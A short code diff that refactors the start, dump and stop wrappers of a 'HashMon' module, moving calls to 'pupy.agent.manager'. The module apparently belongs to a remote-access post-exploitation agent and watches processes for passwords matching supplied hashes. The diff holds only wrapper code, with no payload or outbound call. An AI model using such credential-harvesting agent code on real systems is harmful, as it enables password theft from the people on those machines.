@@ -21,11 +21,11 @@ if sys.version_info.major > 2:
 
 
 def start(names, hashes=[], poll=20, minpw=8, maxpw=16, maxdups=131072, policy=True):
-    if pupy.manager.active(HashMon):
+    if pupy.agent.manager.active(HashMon):
         return False
 
     try:
-        pupy.manager.create(
+        pupy.agent.manager.create(
             HashMon,
             names, hashes=hashes, poll=poll, minpw=minpw,
             maxpw=maxpw, maxdups=maxdups, policy=policy
@@ -37,15 +37,15 @@ def start(names, hashes=[], poll=20, minpw=8, maxpw=16, maxdups=131072, policy=T
 
 
 def dump():
-    mon = pupy.manager.get(HashMon)
+    mon = pupy.agent.manager.get(HashMon)
     if mon:
         return mon.results
 
 
 def stop():
-    mon = pupy.manager.get(HashMon)
+    mon = pupy.agent.manager.get(HashMon)
     if mon:
-        pupy.manager.stop(HashMon)
+        pupy.agent.manager.stop(HashMon)
         return mon.results
 
 
